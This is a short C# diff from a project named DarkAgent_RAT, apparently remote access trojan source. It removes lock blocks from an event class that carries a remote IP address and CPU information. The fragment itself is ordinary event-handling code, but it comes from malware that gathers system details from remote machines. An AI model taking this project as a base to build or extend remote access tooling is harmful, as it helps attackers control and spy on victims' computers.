@@ -11,28 +11,20 @@ namespace DarkAgent_RAT.src.Events
     {
         public readonly string RemoteIP;
         public readonly CpuInfo cpuInfo;
-        private Object locky = new Object();
         public CpuInfoEventArgs(string RemoteIP, CpuInfo info)
         {
-            lock(locky)
-            {
-                this.RemoteIP = RemoteIP;
-                this.cpuInfo = info;
-            }
+            this.RemoteIP = RemoteIP;
+            this.cpuInfo = info;
         }
     }
 
     public class CpuInfoEvent
     {
         public static event CpuInfoHandler CpuInfo;
-        private static Object locky = new Object();
         public static void OnCpuInfo(CpuInfoEventArgs e)
         {
-            lock(locky)
-            {
-                if (CpuInfo != null)
-                    CpuInfo(new object(), e);
-            }
+            if (CpuInfo != null)
+                CpuInfo(new object(), e);
         }
     }
 }
